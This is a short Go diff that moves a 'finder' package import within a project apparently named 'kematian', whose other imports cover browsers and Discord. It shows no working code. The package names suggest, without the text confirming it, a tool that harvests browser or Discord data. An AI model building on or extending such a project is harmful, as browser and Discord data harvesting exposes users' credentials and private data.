@@ -2,7 +2,7 @@ package main
 
 import (
 	"kdot/kematian/browsers"
-	"kdot/kematian/browsers/chromium/finder"
+	"kdot/kematian/browsers/finder"
 	"kdot/kematian/discord"
 	"os"
 	"sync"
